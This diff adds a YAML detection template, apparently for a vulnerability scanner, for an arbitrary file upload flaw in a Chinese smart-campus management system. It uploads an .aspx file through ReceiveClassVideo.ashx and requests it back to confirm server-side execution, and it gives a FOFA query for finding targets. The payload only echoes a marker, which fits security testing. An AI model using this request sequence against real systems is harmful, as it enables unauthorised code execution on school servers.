@@ -1,0 +1,46 @@
+id: poc-yaml-wincard-receiveclassvideo-upload
+info:
+  name: 智慧校园(安校易)管理系统ReceiveClassVideo任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 智慧校园(安校易)管理系统
+  fofa: title="智慧综合管理平台登入"
+variables:
+  str1: to_lower(random_str(10))
+  t1: random_int(100,1000)
+requests:
+- method: POST
+  path: /Tool/ReceiveClassVideo.ashx?file_tmid={{.t1}}&orgid=1&classID=1
+  headers:
+    Content-Type: multipart/form-data; boundary=----dqdaieopnozbkapjacdbdthlvtlyl
+    X-Requested-With: XMLHttpRequest
+  data: '------dqdaieopnozbkapjacdbdthlvtlyl
+
+    Content-Disposition: form-data; name="File1"; filename="1.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    <%Response.Write("{{.str1}}");%>
+
+    ------dqdaieopnozbkapjacdbdthlvtlyl--
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"保存班级视频") &&
+
+    contains(body,"rst:false")
+
+    '
+- method: GET
+  path: /Upload/AD_Info/1/{{.t1}}.aspx
+  expression: 'status_code == 200 &&
+
+    body == str1
+
+    '
+transport: http
